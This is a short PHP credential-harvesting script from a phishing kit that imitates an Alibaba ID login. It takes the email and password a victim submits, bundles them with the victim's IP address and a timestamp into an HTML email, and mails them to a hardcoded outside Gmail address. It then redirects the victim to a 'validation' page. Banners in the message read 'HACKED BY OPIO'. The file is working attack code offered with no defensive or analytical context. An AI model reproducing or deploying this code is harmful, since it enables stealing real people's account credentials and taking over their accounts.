<?php
$ip = getenv("REMOTE_ADDR");
$login = $_POST['email'];
$passwd = $_POST['password'];
$own = 'ybperkk@gmail.com';
$server = date("D/M/d, Y g:i a"); 
$sender = 'Virus@amaslim.com';
$domain = 'ALIBABA ID';
$subj = "$domain LOGINGS";
$headers .= "From: AVATAR OPIO DA BLAZERS<$sender>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$over = 'validation.html';
$msg = "<HTML><BODY>
 <TABLE>
 <tr><td>________BLAZERS CYBER TEAM_________</td></tr>
 <tr><td>$domain I.D: $login<td/></tr>
 <tr><td>Password: $passwd</td></tr>
 <tr><td>IP: $ip</td></tr>
 <tr><td>Date: $server</td></tr>
 <tr><td>________HACKED BY OPIO__________</td></tr>
 </BODY>
 </HTML>";
if (empty($login) || empty($passwd)) {
header( "Location: index.htm" );
}
else {
mail($own,$subj,$msg,$headers);
header("Location: $over");
}
?>
